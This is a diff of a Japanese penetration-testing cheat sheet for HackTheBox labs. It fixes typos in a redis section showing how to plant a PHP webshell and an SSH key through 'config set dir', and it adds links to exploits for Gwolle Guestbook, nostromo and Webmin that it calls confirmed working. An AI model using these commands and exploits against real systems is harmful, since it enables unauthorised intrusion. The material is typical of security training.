@@ -1271,7 +1271,7 @@ redis-cli -h 10.10.10.160
 ```
 
 Webshell:  
-Webサイトのディクレクトリ配下に書き込み権限がある場合に任意のPHPを仕込める。る
+Webサイトのディクレクトリ配下に書き込み権限がある場合に任意のPHPを仕込める。
 ```
 kali@kali:~# redis-cli -h 10.10.10.160
 10.10.10.160:6379> config set dir /var/www/html/
@@ -1286,7 +1286,7 @@ OK
 
 
 SSH:  
-"config get dir"コマンドによりredisユーザのhomeを確認d家いる。  
+"config get dir"コマンドによりredisユーザのhomeを確認できる。  
 これにより.ssh配下に書き込み権限がある場合に公開鍵を配置してやることでアクセスが可能になる。
 ```
 ssh-keygen -t rsa -f id_rsa
@@ -3217,7 +3217,7 @@ https://github.com/itm4n/PrintSpoofer.git
 Windows-kernel-exploits:  
 https://github.com/SecWiki/windows-kernel-exploits.git
 
-# Experience with HackTheBox
+# Experience with HackTheBox(動作確認済みexploit)
 ## Initial Shell(Linux)
 ```
 Samba 3.0.20:
@@ -3250,6 +3250,12 @@ https://www.exploit-db.com/exploits/32745
 Exploit-DBのものより、下記のエクスプロイトの方が使用しやすい
 https://gist.github.com/eelsivart/10174134
 for i in $(seq 1 100); do python2 heartbleed.py 10.10.10.79; done
+
+WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion:  
+https://www.exploit-db.com/exploits/38861
+
+nostromo 1.9.6 - Remote Code Execution:  
+https://www.exploit-db.com/exploits/47837
 ```
 
 ## Privilege Escalation(Linux)
@@ -3269,6 +3275,9 @@ https://www.exploit-db.com/exploits/33899
 
 Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation:
 https://www.exploit-db.com/exploits/45010
+
+Webmin-1.910-Exploit-Script:  
+https://github.com/roughiz/Webmin-1.910-Exploit-Script
 ```
 
 ## Initial Shell(Windows)
